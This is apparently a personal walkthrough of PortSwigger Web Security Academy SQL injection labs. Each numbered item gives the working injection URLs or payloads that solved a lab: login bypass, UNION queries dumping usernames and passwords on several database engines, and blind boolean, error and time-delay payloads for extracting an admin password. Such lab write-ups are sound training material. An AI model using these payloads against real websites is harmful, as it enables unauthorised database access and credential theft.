SQL injection cheat sheet from PortSwigger: https://portswigger.net/web-security/sql-injection/cheat-sheet

1. Injection url at `https://ac881f2e1f5cb550c093b68c00e60083.web-security-academy.net/filter?category=Accessories%27%20OR%201=1--`
2. Sign in with the username `administrator-- ` and any password
3. By injecting `ORDERY BY` clauses, can determine that there are 3 columns being returned. Final injection url is `https://ac2f1fdf1e3f17fbc0a75a57003900e4.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20NULL,NULL,NULL--`
4. Using above, there are 3 columns again. By individually changing out the `NULL`s in above injection url with `'a'`, can find that the 2nd parameter is compatible with strings. Final injection url is `https://ac8a1fba1f703e4bc0be397e000800dc.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20NULL,%27Nk9mcJ%27,NULL--` for my provided random string of `Nk9mcJ`
5. Discovered using previous methods that there are 2 columns, each of which contains strings. Final injection url is `https://ac4e1faa1f86dd2ac04803a200c5007f.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20username,%20password%20FROM%20users--`. This dumps user credentials that can then be used to sign into the `administrator` account
6. This lab is the same as above, with 2 columns that both can accept strings. From the lab title, we know that the SQL server is running Oracle SQL, so the final injection url is `https://aca81ff91ed5fbc1c09e023600020089.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20banner,NULL%20FROM%20v$version--`
7. This lab is the same as the above, but running either Microsoft SQL or MySQL. The following injection url works in either case `https://ac0d1f6d1e91ef7fc0fa9a35002900d5.web-security-academy.net/filter?category=Lifestyle%27UNION%20SELECT%20@@version,NULL--%20`
8. This lab has the same setup as above, but the only thing known about the SQL server is that it's not Oracle. To get a dump of the table names, the following injection can be used `https://ac251f8a1fc71a32c0e0893800580088.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20table_name,NULL%20FROM%20information_schema.tables--%20`. Using the retrieved user table name, the column names can be retrieved via `https://ac251f8a1fc71a32c0e0893800580088.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_msjjll%27--%20`. This allows the user's table to be dumped with the following `https://ac251f8a1fc71a32c0e0893800580088.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20username_hogyer,password_iublmj%20FROM%20users_msjjll--%20`. Using the dumped credentials, you can then sign in as the `administrator` user to solve the lab
9. This lab is the same as the above but running Oracle SQL. The following injection urls are used instead to account for this difference:
	* Retrieve table names: `https://ac121f491e6506ecc0c8010800ae00d5.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20table_name,NULL%20FROM%20all_tables--`
	* Retrieve column names: `https://ac121f491e6506ecc0c8010800ae00d5.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20column_name,NULL%20FROM%20all_tab_columns%20WHERE%20table_name=%27USERS_SILFLI%27--`
	* Dump credentials: `https://ac121f491e6506ecc0c8010800ae00d5.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20USERNAME_ZZWZAI,PASSWORD_HRKZKT%20FROM%20USERS_SILFLI--`
10. Can find that there are 2 columns returned, and only the 2nd one is compatible with strings. Based off what commands work, the server appears to be using PostgreSQL. Final injection url `https://acc01f5b1f89a225c15b21b300a10020.web-security-academy.net/filter?category=Lifestyle%27UNION%20SELECT%20NULL,username%20||%20%27:%27%20||%20%20password%20FROM%20users--`
11. If the tracking ID query has a response, there is a `Welcome back!` message between the `Home` and `My Account` links. To figure out the length of the admin password, the following tracking ID can be used (and modified until no longer returning true) `JhGf5QQKPyCq5Y1X' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 1) = 'a`. This reveals that the password is 20 characters long. For the sake of simplicity with the brute force, we will assume that the password matches the regex `[0-9a-z]{20}`, and the brute force is done by `cond_resp.py` (Note that this takes a while. Due to the case insensitivity of SQL, binary search is difficult so I just relied on a straight brute force)
12. By using the following injection in the tracking ID, the length of the admin password can be found as 20 characters again `<id>' AND (SELECT CASE WHEN (LENGTH(password) = 20) THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a`. This is shown because there will be an internal server error whenever the provided case is true, and none if the case is false. From there the same brute force from above can be modified to work, as shown in `cond_error.py`
13. Through trial and error, it can be found that the server is running PostgreSQL. The following tracking id payload causes the 10 second delay to solve the lab `<id>'||pg_sleep(10)--`
14. Same as above, it can be found that the server is running PostgreSQL. The following payload can be used to determine that the length of the admin password is 20 characters `<id>'%3bSELECT CASE WHEN (username='administrator' AND LENGTH(password) < 20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` (note that `%3b` is a url-encoded semicolon. It has to be encoded because semicolons are the way cookies are separated from each other in the HTTP spec). From there, the previous brute forces can be modified to use time delays, as shown in `cond_delay.py`
15. This lab requires triggering an out of band DNS lookup. However, the lab server blocks outgoing requests that are not going to the Burp Collaborator domain, so this lab is not possible without using Burpsuite Pro
16. Same as above lab, but this time for exfiltrating data
